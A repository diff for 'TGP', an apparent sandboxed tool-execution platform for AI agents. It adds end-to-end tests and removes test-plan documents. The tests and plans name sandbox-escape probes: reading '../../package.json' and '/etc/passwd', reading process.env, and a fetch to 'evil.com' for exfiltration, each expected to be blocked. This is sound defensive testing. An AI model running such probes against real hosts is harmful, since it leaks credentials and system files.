@@ -31,6 +31,14 @@ src/
   index.ts
   tgp.ts
   types.ts
+test/
+  e2e/
+    scenarios.test.d.ts
+    scenarios.test.js
+    scenarios.test.ts
+    utils.d.ts
+    utils.js
+    utils.ts
 test-docs/
   e2e.test-plan.md
   integration.test-plan.md
@@ -42,6 +50,666 @@ tsconfig.json
 ```
 
 # Files
+
+## File: test/e2e/scenarios.test.d.ts
+````typescript
+export {};
+````
+
+## File: test/e2e/scenarios.test.js
+````javascript
+import { describe, it, expect, beforeEach, afterEach } from 'vitest';
+import * as fs from 'fs/promises';
+import * as path from 'path';
+import { createTempDir, initBareRepo, createTgpConfig, runTgpCli, cleanupDir } from './utils.js';
+import { TGP } from '../../src/tgp.js';
+import { tgpTools } from '../../src/tools/index.js';
+import { createSqlTools } from '../../src/tools/sql.js';
+describe('E2E Scenarios', () => {
+    let tempDir;
+    let remoteRepo;
+    beforeEach(async () => {
+        tempDir = await createTempDir();
+        remoteRepo = await createTempDir('tgp-remote-');
+        await initBareRepo(remoteRepo);
+    });
+    afterEach(async () => {
+        await cleanupDir(tempDir);
+        await cleanupDir(remoteRepo);
+    });
+    it('Scenario 1: Cold Start (Hydration, Fabrication, Execution)', async () => {
+        // 1. Setup Config
+        const configPath = await createTgpConfig(tempDir, remoteRepo);
+        // 2. Boot Kernel
+        const kernel = new TGP({ configFile: configPath });
+        await kernel.boot();
+        const tools = tgpTools(kernel);
+        // 3. Create a Tool (Fibonacci)
+        const fibPath = 'tools/math/fib.ts';
+        const fibCode = `
+      export default function fib(args: { n: number }) {
+        const n = args.n;
+        if (n <= 1) return n;
+        let a = 0, b = 1;
+        for (let i = 2; i <= n; i++) {
+          const temp = a + b;
+          a = b;
+          b = temp;
+        }
+        return b;
+      }
+    `;
+        const writeRes = await tools.write_file.execute({ path: fibPath, content: fibCode });
+        expect(writeRes.success).toBe(true);
+        // 4. Validate Tool
+        const checkRes = await tools.check_tool.execute({ path: fibPath });
+        expect(checkRes.valid).toBe(true);
+        // 5. Execute Tool
+        const execRes = await tools.exec_tool.execute({ path: fibPath, args: { n: 10 } });
+        expect(execRes.success).toBe(true);
+        expect(execRes.result).toBe(55);
+        // 6. Verify Persistence
+        // Clone remote repo to a new dir and check file existence
+        const verifyDir = await createTempDir('tgp-verify-');
+        const { execSync } = await import('node:child_process');
+        execSync(`git clone ${remoteRepo} .`, { cwd: verifyDir, stdio: 'ignore' });
+        const exists = await fs.access(path.join(verifyDir, fibPath)).then(() => true).catch(() => false);
+        expect(exists).toBe(true);
+        await cleanupDir(verifyDir);
+    });
+    it('Scenario 2: Concurrency (The Merge Test)', async () => {
+        // Agent A
+        const dirA = await createTempDir('tgp-agent-a-');
+        const configA = await createTgpConfig(dirA, remoteRepo);
+        const kernelA = new TGP({ configFile: configA });
+        await kernelA.boot();
+        // Agent B
+        const dirB = await createTempDir('tgp-agent-b-');
+        const configB = await createTgpConfig(dirB, remoteRepo);
+        const kernelB = new TGP({ configFile: configB });
+        await kernelB.boot();
+        const toolsA = tgpTools(kernelA);
+        const toolsB = tgpTools(kernelB);
+        // Both agents create different tools simultaneously
+        // This forces one to fail the push, auto-rebase, and push again.
+        await Promise.all([
+            toolsA.write_file.execute({
+                path: 'tools/tool_A.ts',
+                content: 'export default () => "A"'
+            }),
+            toolsB.write_file.execute({
+                path: 'tools/tool_B.ts',
+                content: 'export default () => "B"'
+            })
+        ]);
+        // Verify using a fresh Agent C
+        const dirC = await createTempDir('tgp-agent-c-');
+        const configC = await createTgpConfig(dirC, remoteRepo);
+        const kernelC = new TGP({ configFile: configC });
+        await kernelC.boot();
+        const files = await kernelC.vfs.listFiles('tools');
+        expect(files).toContain('tools/tool_A.ts');
+        expect(files).toContain('tools/tool_B.ts');
+        await cleanupDir(dirA);
+        await cleanupDir(dirB);
+        await cleanupDir(dirC);
+    });
+    it('Scenario 3: Refactor (Search & Replace)', async () => {
+        const configPath = await createTgpConfig(tempDir, remoteRepo);
+        const kernel = new TGP({ configFile: configPath });
+        await kernel.boot();
+        const tools = tgpTools(kernel);
+        const toolName = 'tools/greet.ts';
+        await tools.write_file.execute({
+            path: toolName,
+            content: `export default function(args: { name: string }) { return "hello " + args.name; }`
+        });
+        let res = await tools.exec_tool.execute({ path: toolName, args: { name: 'world' } });
+        expect(res.result).toBe('hello world');
+        await tools.patch_file.execute({
+            path: toolName,
+            search: 'return "hello " + args.name;',
+            replace: 'return "greetings " + args.name;'
+        });
+        res = await tools.exec_tool.execute({ path: toolName, args: { name: 'world' } });
+        expect(res.result).toBe('greetings world');
+    });
+    it('Scenario 4: Resilience (Infinite Loop)', async () => {
+        const configPath = await createTgpConfig(tempDir, remoteRepo);
+        const kernel = new TGP({ configFile: configPath });
+        await kernel.boot();
+        const tools = tgpTools(kernel);
+        const badTool = 'tools/freeze.ts';
+        await tools.write_file.execute({
+            path: badTool,
+            content: `export default function() { while(true) {} }`
+        });
+        const res = await tools.exec_tool.execute({ path: badTool, args: {} });
+        expect(res.success).toBe(false);
+        expect(res.error).toMatch(/timed out/i);
+    });
+    it('Scenario 5: Security (Jailbreak)', async () => {
+        const configPath = await createTgpConfig(tempDir, remoteRepo);
+        const kernel = new TGP({ configFile: configPath });
+        await kernel.boot();
+        const tools = tgpTools(kernel);
+        const hackTool = 'tools/hack.ts';
+        await tools.write_file.execute({
+            path: hackTool,
+            content: `
+        export default async function() {
+           return await tgp.read_file('../../package.json');
+        }
+      `
+        });
+        const res = await tools.exec_tool.execute({ path: hackTool, args: {} });
+        expect(res.success).toBe(false);
+        expect(res.error).toMatch(/Security Violation/i);
+    });
+    it('Scenario 6: SQL Error Propagation', async () => {
+        const configPath = await createTgpConfig(tempDir, remoteRepo);
+        const kernel = new TGP({ configFile: configPath });
+        await kernel.boot();
+        // Mock DB executor
+        // eslint-disable-next-line @typescript-eslint/no-explicit-any
+        const mockExecutor = async (sql, _params) => {
+            if (sql.includes('fail')) {
+                throw new Error('Database Error');
+            }
+            return [];
+        };
+        const tools = { ...tgpTools(kernel), ...createSqlTools(mockExecutor) };
+        const dbTool = 'tools/db_ops.ts';
+        await tools.write_file.execute({
+            path: dbTool,
+            content: `
+        export default async function(args: { crash: boolean }) {
+           if (args.crash) {
+              await tgp.exec_sql('SELECT * FROM users WHERE name = "fail"', []);
+           }
+        }
+      `
+        });
+        const res = await tools.exec_tool.execute({ path: dbTool, args: { crash: true } });
+        expect(res.success).toBe(false);
+        expect(res.error).toContain('Database Error');
+    });
+    it('Scenario 8: CLI Bootstrap', async () => {
+        const { code } = await runTgpCli(['init'], tempDir);
+        expect(code).toBe(0);
+        const configExists = await fs.access(path.join(tempDir, 'tgp.config.ts')).then(() => true).catch(() => false);
+        expect(configExists).toBe(true);
+        const metaExists = await fs.access(path.join(tempDir, '.tgp/meta.json')).then(() => true).catch(() => false);
+        expect(metaExists).toBe(true);
+    });
+});
+````
+
+## File: test/e2e/scenarios.test.ts
+````typescript
+import { describe, it, expect, beforeEach, afterEach } from 'vitest';
+import * as fs from 'fs/promises';
+import * as path from 'path';
+import { createTempDir, initBareRepo, createTgpConfig, runTgpCli, cleanupDir } from './utils.js';
+import { TGP } from '../../src/tgp.js';
+import { tgpTools } from '../../src/tools/index.js';
+import { createSqlTools } from '../../src/tools/sql.js';
+
+describe('E2E Scenarios', () => {
+  let tempDir: string;
+  let remoteRepo: string;
+
+  beforeEach(async () => {
+    tempDir = await createTempDir();
+    remoteRepo = await createTempDir('tgp-remote-');
+    await initBareRepo(remoteRepo);
+  });
+
+  afterEach(async () => {
+    await cleanupDir(tempDir);
+    await cleanupDir(remoteRepo);
+  });
+
+  it('Scenario 1: Cold Start (Hydration, Fabrication, Execution)', async () => {
+    // 1. Setup Config
+    const configPath = await createTgpConfig(tempDir, remoteRepo);
+    
+    // 2. Boot Kernel
+    const kernel = new TGP({ configFile: configPath });
+    await kernel.boot();
+    
+    const tools = tgpTools(kernel);
+
+    // 3. Create a Tool (Fibonacci)
+    const fibPath = 'tools/math/fib.ts';
+    const fibCode = `
+      export default function fib(args: { n: number }) {
+        const n = args.n;
+        if (n <= 1) return n;
+        let a = 0, b = 1;
+        for (let i = 2; i <= n; i++) {
+          const temp = a + b;
+          a = b;
+          b = temp;
+        }
+        return b;
+      }
+    `;
+
+    const writeRes = await tools.write_file.execute({ path: fibPath, content: fibCode });
+    expect(writeRes.success).toBe(true);
+
+    // 4. Validate Tool
+    const checkRes = await tools.check_tool.execute({ path: fibPath });
+    expect(checkRes.valid).toBe(true);
+
+    // 5. Execute Tool
+    const execRes = await tools.exec_tool.execute({ path: fibPath, args: { n: 10 } });
+    expect(execRes.success).toBe(true);
+    expect(execRes.result).toBe(55);
+
+    // 6. Verify Persistence
+    // Clone remote repo to a new dir and check file existence
+    const verifyDir = await createTempDir('tgp-verify-');
+    const { execSync } = await import('node:child_process');
+    execSync(`git clone ${remoteRepo} .`, { cwd: verifyDir, stdio: 'ignore' });
+    
+    const exists = await fs.access(path.join(verifyDir, fibPath)).then(() => true).catch(() => false);
+    expect(exists).toBe(true);
+
+    await cleanupDir(verifyDir);
+  });
+
+  it('Scenario 2: Concurrency (The Merge Test)', async () => {
+    // Agent A
+    const dirA = await createTempDir('tgp-agent-a-');
+    const configA = await createTgpConfig(dirA, remoteRepo);
+    const kernelA = new TGP({ configFile: configA });
+    await kernelA.boot();
+
+    // Agent B
+    const dirB = await createTempDir('tgp-agent-b-');
+    const configB = await createTgpConfig(dirB, remoteRepo);
+    const kernelB = new TGP({ configFile: configB });
+    await kernelB.boot();
+
+    const toolsA = tgpTools(kernelA);
+    const toolsB = tgpTools(kernelB);
+
+    // Both agents create different tools simultaneously
+    // This forces one to fail the push, auto-rebase, and push again.
+    await Promise.all([
+      toolsA.write_file.execute({ 
+        path: 'tools/tool_A.ts', 
+        content: 'export default () => "A"' 
+      }),
+      toolsB.write_file.execute({ 
+        path: 'tools/tool_B.ts', 
+        content: 'export default () => "B"' 
+      })
+    ]);
+    
+    // Verify using a fresh Agent C
+    const dirC = await createTempDir('tgp-agent-c-');
+    const configC = await createTgpConfig(dirC, remoteRepo);
+    const kernelC = new TGP({ configFile: configC });
+    await kernelC.boot();
+    
+    const files = await kernelC.vfs.listFiles('tools');
+    expect(files).toContain('tools/tool_A.ts');
+    expect(files).toContain('tools/tool_B.ts');
+
+    await cleanupDir(dirA);
+    await cleanupDir(dirB);
+    await cleanupDir(dirC);
+  });
+
+  it('Scenario 3: Refactor (Search & Replace)', async () => {
+    const configPath = await createTgpConfig(tempDir, remoteRepo);
+    const kernel = new TGP({ configFile: configPath });
+    await kernel.boot();
+    const tools = tgpTools(kernel);
+
+    const toolName = 'tools/greet.ts';
+    await tools.write_file.execute({ 
+      path: toolName, 
+      content: `export default function(args: { name: string }) { return "hello " + args.name; }`
+    });
+
+    let res = await tools.exec_tool.execute({ path: toolName, args: { name: 'world' } });
+    expect(res.result).toBe('hello world');
+
+    await tools.patch_file.execute({
+      path: toolName,
+      search: 'return "hello " + args.name;',
+      replace: 'return "greetings " + args.name;'
+    });
+
+    res = await tools.exec_tool.execute({ path: toolName, args: { name: 'world' } });
+    expect(res.result).toBe('greetings world');
+  });
+
+  it('Scenario 4: Resilience (Infinite Loop)', async () => {
+    const configPath = await createTgpConfig(tempDir, remoteRepo);
+    const kernel = new TGP({ configFile: configPath });
+    await kernel.boot();
+    const tools = tgpTools(kernel);
+
+    const badTool = 'tools/freeze.ts';
+    await tools.write_file.execute({
+      path: badTool,
+      content: `export default function() { while(true) {} }`
+    });
+
+    const res = await tools.exec_tool.execute({ path: badTool, args: {} });
+    expect(res.success).toBe(false);
+    expect(res.error).toMatch(/timed out/i);
+  });
+
+  it('Scenario 5: Security (Jailbreak)', async () => {
+    const configPath = await createTgpConfig(tempDir, remoteRepo);
+    const kernel = new TGP({ configFile: configPath });
+    await kernel.boot();
+    const tools = tgpTools(kernel);
+
+    const hackTool = 'tools/hack.ts';
+    await tools.write_file.execute({
+      path: hackTool,
+      content: `
+        export default async function() {
+           return await tgp.read_file('../../package.json');
+        }
+      `
+    });
+
+    const res = await tools.exec_tool.execute({ path: hackTool, args: {} });
+    expect(res.success).toBe(false);
+    expect(res.error).toMatch(/Security Violation/i);
+  });
+
+  it('Scenario 6: SQL Error Propagation', async () => {
+    const configPath = await createTgpConfig(tempDir, remoteRepo);
+    const kernel = new TGP({ configFile: configPath });
+    await kernel.boot();
+
+    // Mock DB executor
+    // eslint-disable-next-line @typescript-eslint/no-explicit-any
+    const mockExecutor = async (sql: string, _params: any[]) => {
+      if (sql.includes('fail')) {
+        throw new Error('Database Error');
+      }
+      return [];
+    };
+
+    const tools = { ...tgpTools(kernel), ...createSqlTools(mockExecutor) };
+
+    const dbTool = 'tools/db_ops.ts';
+    await tools.write_file.execute({
+      path: dbTool,
+      content: `
+        export default async function(args: { crash: boolean }) {
+           if (args.crash) {
+              await tgp.exec_sql('SELECT * FROM users WHERE name = "fail"', []);
+           }
+        }
+      `
+    });
+
+    const res = await tools.exec_tool.execute({ path: dbTool, args: { crash: true } });
+    expect(res.success).toBe(false);
+    expect(res.error).toContain('Database Error');
+  });
+
+  it('Scenario 8: CLI Bootstrap', async () => {
+    const { code } = await runTgpCli(['init'], tempDir);
+    expect(code).toBe(0);
+    
+    const configExists = await fs.access(path.join(tempDir, 'tgp.config.ts')).then(() => true).catch(() => false);
+    expect(configExists).toBe(true);
+    
+    const metaExists = await fs.access(path.join(tempDir, '.tgp/meta.json')).then(() => true).catch(() => false);
+    expect(metaExists).toBe(true);
+  });
+});
+````
+
+## File: test/e2e/utils.d.ts
+````typescript
+/**
+ * Creates a unique temporary directory for a test case.
+ * Registers it for auto-cleanup on process exit.
+ */
+export declare function createTempDir(prefix?: string): Promise<string>;
+/**
+ * Recursively deletes a directory.
+ */
+export declare function cleanupDir(dir: string): Promise<void>;
+/**
+ * Initializes a bare Git repository at the specified path.
+ * This serves as the 'Remote' for the E2E tests.
+ */
+export declare function initBareRepo(dir: string): Promise<void>;
+/**
+ * Generates a tgp.config.js file in the test directory pointing to the local bare repo.
+ * Uses .js to avoid compilation dependencies and uses absolute paths for isolation.
+ */
+export declare function createTgpConfig(workDir: string, remoteRepo: string, fileName?: string): Promise<string>;
+/**
+ * Executes the TGP CLI binary in the given directory.
+ */
+export declare function runTgpCli(args: string[], cwd: string): Promise<{
+    stdout: string;
+    stderr: string;
+    code: number;
+}>;
+````
+
+## File: test/e2e/utils.js
+````javascript
+import * as fs from 'node:fs/promises';
+import * as path from 'node:path';
+import * as os from 'node:os';
+import { spawn, execSync } from 'node:child_process';
+import { fileURLToPath } from 'node:url';
+// ESM Polyfills
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = path.dirname(__filename);
+// Track temp dirs for cleanup
+const tempDirs = [];
+/**
+ * Creates a unique temporary directory for a test case.
+ * Registers it for auto-cleanup on process exit.
+ */
+export async function createTempDir(prefix = 'tgp-e2e-') {
+    const tmpDir = os.tmpdir();
+    const dir = await fs.mkdtemp(path.join(tmpDir, prefix));
+    tempDirs.push(dir);
+    return dir;
+}
+/**
+ * Recursively deletes a directory.
+ */
+export async function cleanupDir(dir) {
+    await fs.rm(dir, { recursive: true, force: true }).catch(() => { });
+}
+/**
+ * Initializes a bare Git repository at the specified path.
+ * This serves as the 'Remote' for the E2E tests.
+ */
+export async function initBareRepo(dir) {
+    await fs.mkdir(dir, { recursive: true });
+    execSync(`git init --bare`, { cwd: dir, stdio: 'ignore' });
+    // Set default branch to main
+    execSync(`git symbolic-ref HEAD refs/heads/main`, { cwd: dir, stdio: 'ignore' });
+}
+/**
+ * Generates a tgp.config.js file in the test directory pointing to the local bare repo.
+ * Uses .js to avoid compilation dependencies and uses absolute paths for isolation.
+ */
+export async function createTgpConfig(workDir, remoteRepo, fileName = 'tgp.config.js') {
+    // We use an absolute path for rootDir to ensure tests don't pollute the project root
+    // regardless of where the process CWD is.
+    const rootDir = path.join(workDir, '.tgp').split(path.sep).join('/');
+    const remotePath = remoteRepo.split(path.sep).join('/');
+    const allowedDir = workDir.split(path.sep).join('/');
+    const configContent = `
+export default {
+  rootDir: '${rootDir}',
+  git: {
+    provider: 'local',
+    repo: '${remotePath}',
+    branch: 'main',
+    auth: { token: 'mock', user: 'test', email: 'test@example.com' }
+  },
+  fs: {
+    allowedDirs: ['${allowedDir}', '${os.tmpdir().split(path.sep).join('/')}'],
+    blockUpwardTraversal: false
+  },
+  allowedImports: ['zod', 'date-fns']
+};
+`;
+    const configPath = path.join(workDir, fileName);
+    await fs.writeFile(configPath, configContent);
+    return configPath;
+}
+/**
+ * Executes the TGP CLI binary in the given directory.
+ */
+export function runTgpCli(args, cwd) {
+    return new Promise((resolve) => {
+        const tgpBin = path.resolve(__dirname, '../../bin/tgp.js');
+        const proc = spawn('node', [tgpBin, ...args], {
+            cwd,
+            env: { ...process.env, NODE_ENV: 'test' }
+        });
+        let stdout = '';
+        let stderr = '';
+        proc.stdout.on('data', d => stdout += d.toString());
+        proc.stderr.on('data', d => stderr += d.toString());
+        proc.on('close', (code) => {
+            resolve({ stdout, stderr, code: code ?? -1 });
+        });
+    });
+}
+// Cleanup hook
+process.on('exit', () => {
+    // Sync cleanup on exit is limited, but we try best effort
+    tempDirs.forEach(d => {
+        try {
+            execSync(`rm -rf ${d}`);
+        }
+        catch { }
+    });
+});
+````
+
+## File: test/e2e/utils.ts
+````typescript
+import * as fs from 'node:fs/promises';
+import * as path from 'node:path';
+import * as os from 'node:os';
+import { spawn, execSync } from 'node:child_process';
+import { fileURLToPath } from 'node:url';
+
+// ESM Polyfills
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = path.dirname(__filename);
+
+// Track temp dirs for cleanup
+const tempDirs: string[] = [];
+
+/**
+ * Creates a unique temporary directory for a test case.
+ * Registers it for auto-cleanup on process exit.
+ */
+export async function createTempDir(prefix: string = 'tgp-e2e-'): Promise<string> {
+  const tmpDir = os.tmpdir();
+  const dir = await fs.mkdtemp(path.join(tmpDir, prefix));
+  tempDirs.push(dir);
+  return dir;
+}
+
+/**
+ * Recursively deletes a directory.
+ */
+export async function cleanupDir(dir: string): Promise<void> {
+  await fs.rm(dir, { recursive: true, force: true }).catch(() => {});
+}
+
+/**
+ * Initializes a bare Git repository at the specified path.
+ * This serves as the 'Remote' for the E2E tests.
+ */
+export async function initBareRepo(dir: string): Promise<void> {
+  await fs.mkdir(dir, { recursive: true });
+  execSync(`git init --bare`, { cwd: dir, stdio: 'ignore' });
+  // Set default branch to main
+  execSync(`git symbolic-ref HEAD refs/heads/main`, { cwd: dir, stdio: 'ignore' });
+}
+
+/**
+ * Generates a tgp.config.js file in the test directory pointing to the local bare repo.
+ * Uses .js to avoid compilation dependencies and uses absolute paths for isolation.
+ */
+export async function createTgpConfig(workDir: string, remoteRepo: string, fileName: string = 'tgp.config.js'): Promise<string> {
+    // We use an absolute path for rootDir to ensure tests don't pollute the project root
+    // regardless of where the process CWD is.
+    const rootDir = path.join(workDir, '.tgp').split(path.sep).join('/');
+    const remotePath = remoteRepo.split(path.sep).join('/');
+    const allowedDir = workDir.split(path.sep).join('/');
+
+    const configContent = `
+export default {
+  rootDir: '${rootDir}',
+  git: {
+    provider: 'local',
+    repo: '${remotePath}',
+    branch: 'main',
+    auth: { token: 'mock', user: 'test', email: 'test@example.com' }
+  },
+  fs: {
+    allowedDirs: ['${allowedDir}', '${os.tmpdir().split(path.sep).join('/')}'],
+    blockUpwardTraversal: false
+  },
+  allowedImports: ['zod', 'date-fns']
+};
+`;
+    const configPath = path.join(workDir, fileName);
+    await fs.writeFile(configPath, configContent);
+    return configPath;
+}
+
+/**
+ * Executes the TGP CLI binary in the given directory.
+ */
+export function runTgpCli(args: string[], cwd: string): Promise<{ stdout: string, stderr: string, code: number }> {
+    return new Promise((resolve) => {
+        const tgpBin = path.resolve(__dirname, '../../bin/tgp.js');
+        const proc = spawn('node', [tgpBin, ...args], {
+            cwd,
+            env: { ...process.env, NODE_ENV: 'test' }
+        });
+
+        let stdout = '';
+        let stderr = '';
+
+        proc.stdout.on('data', d => stdout += d.toString());
+        proc.stderr.on('data', d => stderr += d.toString());
+
+        proc.on('close', (code) => {
+            resolve({ stdout, stderr, code: code ?? -1 });
+        });
+    });
+}
+
+// Cleanup hook
+process.on('exit', () => {
+    // Sync cleanup on exit is limited, but we try best effort
+    tempDirs.forEach(d => {
+        try { execSync(`rm -rf ${d}`); } catch {}
+    });
+});
+````
 
 ## File: bin/tgp.js
 ````javascript
@@ -234,245 +902,6 @@ export * from './tgp.js';
 export * from './adapter.js';
 ````
 
-## File: test-docs/e2e.test-plan.md
-````markdown
-# End-to-End Test Plan (Real Implementation)
-
-**Rules:**
-1.  **No Mock, No Spy**: Tests run against the built `bin/tgp.js` or the public API entry point using real dependencies (Git, SQLite, V8).
-2.  **Real Implementation**: Verification involves checking the actual effects on the filesystem, git history, and database state.
-3.  **Isolated**: Each test runs in a unique, ephemeral directory (`/tmp/tgp-e2e-${uuid}`).
-4.  **Idempotent**: Tests can be re-run without manual cleanup (handled by isolation), and operations within tests should handle existing state gracefully.
-5.  **Clean on SIGTERM**: Test harness must ensure child processes and temp files are cleaned up if the test process is interrupted.
-
-## 1. The "Cold Start" Lifecycle (GitOps + Compilation)
-**Story**: An agent wakes up in a serverless environment, connects to a repo, builds a tool, uses it, and shuts down.
-
-1.  **Setup Environment**:
-    -   Create `bare-repo.git` (The Remote).
-    -   Create `config.ts` pointing to `bare-repo.git`.
-2.  **Agent Boot**:
-    -   Initialize TGP Kernel.
-    -   **Assert**: Local filesystem is clean (except for `.git` hydration).
-3.  **Task**: "Create a fibonacci tool".
-    -   Agent calls `write_file('tools/math/fib.ts', ...)` (Real TS code).
-    -   Agent calls `check_tool('tools/math/fib.ts')`. **Assert**: Valid.
-4.  **Execution**:
-    -   Agent calls `exec_tool('tools/math/fib.ts', { n: 10 })`.
-    -   **Assert**: Result is `55`.
-5.  **Shutdown & Persist**:
-    -   Kernel calls `sync()`.
-    -   Process exits.
-6.  **Verification (The "Next" Agent)**:
-    -   Clone `bare-repo.git` to a **new** directory.
-    -   Check file existence: `tools/math/fib.ts`.
-    -   **Assert**: File content matches exactly.
-
-## 2. Multi-Agent Concurrency (The "Merge" Test)
-**Story**: Two agents forge tools simultaneously. TGP must handle Git locking and merging without human intervention.
-
-1.  **Setup**:
-    -   Initialize `bare-repo.git`.
-    -   Instantiate **Agent A** in `dir_A` and **Agent B** in `dir_B` (both pointing to `bare-repo.git`).
-2.  **Parallel Action**:
-    -   Agent A creates `tools/math/add.ts`.
-    -   Agent B creates `tools/math/subtract.ts`.
-3.  **Race Condition**:
-    -   Agent A calls `sync()` (Push succeeds).
-    -   Agent B calls `sync()` immediately after.
-        -   **Expect**: Git push rejected (non-fast-forward).
-        -   **Auto-Resolution**: TGP kernel catches error, pulls (rebase/merge), and pushes again.
-4.  **Verification**:
-    -   Inspect `bare-repo.git` history.
-    -   **Assert**: Both `add.ts` and `subtract.ts` exist in HEAD.
-    -   **Assert**: Commit history is linear or cleanly merged.
-
-## 3. The "Refactor" Scenario (Search & Replace)
-**Story**: An existing tool is broken/outdated. Agent must patch it.
-
-1.  **Pre-condition**: `tools/legacy.ts` exists with `console.log("old")`.
-2.  **Agent Action**:
-    -   Agent reads file.
-    -   Agent calls `patch_file('tools/legacy.ts', ...)` to replace `console.log` with `return`.
-3.  **Verification**:
-    -   Run `exec_tool`.
-    -   **Assert**: Output is returned value, not undefined.
-    -   Read file from disk. **Assert**: Content is updated.
-    -   **Git Verify**: Change is staged/committed in local repo (if auto-commit is on).
-
-## 4. The "Infinite Loop" Self-Defense (Resilience)
-**Story**: Agent generates malicious/buggy code that freezes.
-
-1.  **Action**: Agent creates `tools/freeze.ts` (`while(true){}`).
-2.  **Execution**: Agent calls `exec_tool('tools/freeze.ts')`.
-3.  **Observation**:
-    -   Function call throws exception `ERR_ISOLATE_TIMEOUT`.
-    -   Exception is caught by Kernel.
-    -   **Assert**: Main process (The Agent) remains alive and responsive.
-    -   **Assert**: Memory usage of Main process is stable (V8 isolate disposed).
-
-## 5. Security & Sandbox Jailbreak
-**Story**: Malicious tool attempts to access host resources.
-
-1.  **Filesystem Escape**:
-    -   Create tool `tools/hack.ts` attempting `read_file('../../../etc/passwd')`.
-    -   Execute. **Assert**: Throws `SecurityViolation`.
-2.  **Environment Theft**:
-    -   Create tool `tools/env.ts` attempting to access `process.env`.
-    -   Execute. **Assert**: Throws `ReferenceError` (process is not defined).
-3.  **Network Exfiltration**:
-    -   Create tool `tools/curl.ts` attempting `fetch('http://evil.com')`.
-    -   Execute. **Assert**: Throws `NetworkError` or `SecurityViolation` (not in whitelist).
-
-## 6. Database Transaction Safety (SQL)
-**Story**: A tool performs SQL operations. Logic error triggers rollback.
-
-1.  **Setup**:
-    -   Initialize real SQLite DB `test.db` with table `logs`.
-2.  **Success Path**:
-    -   Tool executes `INSERT INTO logs VALUES ('ok')`.
-    -   **Assert**: Row count = 1.
-3.  **Failure Path (Rollback)**:
-    -   Tool executes:
-        ```typescript
-        sql('INSERT INTO logs VALUES ("bad")');
-        throw new Error("Logic Crash");
-        ```
-    -   Kernel catches error.
-    -   **Assert**: Row count = 1 (The "bad" row was rolled back).
-
-## 7. The "SIGTERM" Cleanliness Test
-**Story**: Deployment platform kills the pod while tool is running.
-
-1.  **Setup**:
-    -   Start TGP process that writes to a database loop or holds a file lock.
-2.  **Action**:
-    -   Send `SIGTERM` to process.
-3.  **Verification**:
-    -   Check Database locks. **Assert**: Released (WAL file clean).
-    -   Check Temporary Files (`/tmp/tgp-*`). **Assert**: Deleted/Cleaned up.
-    -   Check Git Lock files (`index.lock`). **Assert**: Cleared.
-
-## 8. CLI Bootstrap Test
-**Story**: Developer initializes project.
-
-1.  **Action**: Exec `node bin/tgp.js init` in empty dir.
-2.  **Assert**:
-    -   `tgp.config.ts` created.
-    -   `.tgp` folder structure created.
-    -   `package.json` updated (if applicable).
-    -   Run `node bin/tgp.js check`. **Assert**: Passes with no tools.
-````
-
-## File: test-docs/integration.test-plan.md
-````markdown
-# Integration Test Plan (Real Implementation)
-
-**Rules:**
-1.  **No Mock, No Spy**: Tests use real Git binaries, real SQLite drivers, and real V8 isolates.
-2.  **Real Implementation**: Verification involves checking the actual effects on the filesystem, git history, and database state.
-3.  **Isolated**: Each test runs in a unique, ephemeral directory (`/tmp/tgp-integration-${uuid}`).
-4.  **Idempotent**: Tests can be re-run without manual cleanup.
-5.  **Clean on SIGTERM**: Test harness cleans up temp files if interrupted.
-
-## 1. GitOps & Persistence
-**Target**: `src/kernel/git.ts`
-**Setup**:
-1.  Create `REMOTE_DIR` (init bare repo).
-2.  Create `AGENT_DIR` (configured as TGP root).
-
-- [ ] **Hydration (Clone/Pull)**
-    - [ ] Commit a tool `tools/hello.ts` to `REMOTE_DIR` using standard `git` CLI commands.
-    - [ ] Initialize `TGP Kernel` in `AGENT_DIR`.
-    - [ ] **Assert**: `tools/hello.ts` exists in `AGENT_DIR` and is readable.
-- [ ] **Fabrication (Commit/Push)**
-    - [ ] Use Kernel to write `tools/new.ts` in `AGENT_DIR`.
-    - [ ] Trigger Kernel persistence (sync).
-    - [ ] Verify in `REMOTE_DIR` (using `git log`) that a new commit exists with the expected message.
-- [ ] **Concurrency (Locking)**
-    - [ ] Instantiate **two** Kernels pointing to the same `REMOTE_DIR` but different local dirs.
-    - [ ] Agent A writes `toolA.ts`. Agent B writes `toolB.ts`.
-    - [ ] Both sync simultaneously.
-    - [ ] **Assert**: `REMOTE_DIR` contains both files. No merge conflicts (assuming distinct files).
-
-## 2. Kernel <-> Sandbox Bridge
-**Target**: `src/sandbox/bridge.ts`
-
-- [ ] **Host Filesystem Access**
-    - [ ] Create file `data.json` in Host VFS.
-    - [ ] Create tool that uses `tgp.read_file('data.json')`.
-    - [ ] Execute tool.
-    - [ ] **Assert**: Tool returns parsed JSON.
-- [ ] **Recursive Tool Execution**
-    - [ ] Create `tools/multiplier.ts` (returns `a * b`).
-    - [ ] Create `tools/calculator.ts` that imports/calls `multiplier`.
-    - [ ] Execute `calculator`.
-    - [ ] **Assert**: Returns correct result. Verifies internal module resolution works in V8.
-
-## 3. SQL Adapter (Real SQLite)
-**Target**: `src/tools/sql.ts`
-**Setup**: Create `test.db` (SQLite). Run migration to create table `users`.
-
-- [ ] **Query Execution**
-    - [ ] Tool executes `SELECT * FROM users`.
-    - [ ] **Assert**: Returns real rows.
-- [ ] **Transaction Rollback**
-    - [ ] Tool executes:
-        1. `INSERT INTO users ...`
-        2. `throw new Error('Boom')`
-    - [ ] Catch error in test.
-    - [ ] Query `users` table.
-    - [ ] **Assert**: Count is 0 (Rollback successful).
-````
-
-## File: test-docs/unit.test-plan.md
-````markdown
-# Unit Test Plan (Real Implementation)
-
-**Rules:**
-1.  **No Mock, No Spy**: Use real file systems (node:fs), real V8 isolates (isolated-vm).
-2.  **Real Implementation**: Verify logic by observing real output/exceptions.
-3.  **Isolated**: Each test suite creates a unique temporary directory (`/tmp/tgp-unit-${uuid}`).
-4.  **Idempotent**: No shared global state between tests.
-5.  **Clean on SIGTERM**: Register `process.on('SIGTERM')` handlers to wipe temp dirs.
-
-## 1. VFS (Virtual Filesystem) - Node Adapter
-**Target**: `src/vfs/node.ts`
-**Setup**: Create a temporary directory `TEST_ROOT`.
-
-- [ ] **Real I/O Operations**
-    - [ ] `write('deep/nested/file.txt')`: Verify it creates physical directories on disk.
-    - [ ] `read('deep/nested/file.txt')`: Verify it returns exact byte content written.
-    - [ ] `list('deep')`: Verify it returns structure matching OS `ls -R`.
-- [ ] **Path Security (Jail)**
